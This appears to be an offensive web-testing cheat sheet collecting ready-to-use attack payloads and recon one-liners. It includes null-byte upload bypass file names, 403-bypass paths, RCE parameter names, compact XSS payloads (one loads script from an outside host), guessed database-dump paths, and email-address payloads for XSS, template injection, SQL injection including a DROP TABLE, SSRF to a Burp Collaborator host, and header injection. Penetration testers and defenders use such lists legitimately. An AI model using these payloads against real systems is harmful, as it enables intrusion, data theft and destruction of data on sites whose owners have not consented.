# Tips and Tricks

## Null Byte Injection Trick: 
	file.jpg%00shell.php
	shell.php%00file.jpg
	shell.php%00.jp


## Tampering 403 Error Bypass: 
	site.com/secret –> HTTP 403 Forbidden
	site.com/secret/ –> HTTP 200 OK
	site.com/secret/. –> HTTP 200 OK
	site.com//secret// –> HTTP 200 OK
	site.com/./secret/.. –> HTTP 200 OK


## Database Enumeration
	Note: Need to clone: 
	https://github.com/maurosoria/dirsearch
	https://github.com/anantshri/svn-extractor
	
	./dirsearch.py -u target -e php,html,js,xml -x 500,403
	./svn-extractor.py --url http://url.com --match database.php

## Finding hidden get parameters: 
	Note: 	   	
	https://github.com/tomnomnom/assetfinder
	https://github.com/lc/gau
	
	assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done

## RCE Injection: 
	?cmd={payload}
	?exec={payload}
	?command={payload}
	?execute{payload}
	?ping={payload}
	?query={payload}
	?jump={payload}
	?code={payload}
	?reg={payload}
	?do={payload}
	?func={payload}
	?arg={payload}
	?option={payload}
	?load={payload}
	?process={payload}
	?step={payload}
	?read={payload}
	?function={payload}
	?req={payload}
	?feature={payload}
	?exe={payload}
	?module={payload}
	?payload={payload}
	?run={payload}
	?print={payload}

## Small Payloads: 
#### *If number of iframes on the page is constant* 
	<iframe/onload=src=top[0].name+/\Ǌ.₨?/>

#### *If number of iframes on the page is random*
	<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>

#### *If unsafe-inline is disabled in CSP and external scripts allowed*
	<script/src=//Ǌ.₨></script>

#### *If you control the name of the window*
	<iframe/onload=src=top.name>

#### *If you control the name, will work on Firefox in any context, will fail in chromium in DOM*
	<svg/onload=eval(name)>

#### *If you control the URL*
	<svg/onload=eval(`'`+URL)>

##  Finding sensitive information using AlienVault:
##### *Go To* :  https://otx.alienvault.com/indicator/domain/<TARGET>
	curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq
##### *To get only the list of URLs, we could do this*:
	curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq -r '.url_list[].url'
	
##  Forgotten Database Dumps:
	/back.sql
	/backup.sql
	/accounts.sql
	/backups.sql
	/clients.sql
	/customers.sql
	/data.sql
	/database.sql
	/database.sqlite
	/users.sql
	/db.sql
	/db.sqlite
	/db_backup.sql
	/dbase.sql
	/dbdump.sql
	setup.sql
	sqldump.sql
	/dump.sql
	/mysql.sql
	/sql.sql
	/temp.sql


##  Email Address Payloads: 
##### *XSS (Cross-Site Scripting):*
	test+(<script>alert(0)</script>)@example.com
	test@example(<script>alert(0)</script>).com
	"<script>alert(0)</script>"@example.com

## Template injection:
	"<%= 7 * 7 %>"@example.com
	test+(${{7*7}})@example.com

## SQL injection:
	"' OR 1=1 -- '"@example.com
	"mail'); DROP TABLE users;--"@example.com

## SSRF (Server-Side Request Forgery):
	john.doe@abc123.burpcollaborator.net
	john.doe@[127.0.0.1]

##  Parameter pollution:
	victim&email=attacker@example.com

##  (Email) header injection:
	"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
	"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
	
## Extracting endpoints from JavaScript files:
	cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

## Extracting Juicy Information:
	for sub in $(cat domains.txt);do /usr/bin/gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq |egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a file.txt  ;done

## Extracting all the urls from sitemap
	curl -s domain.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'


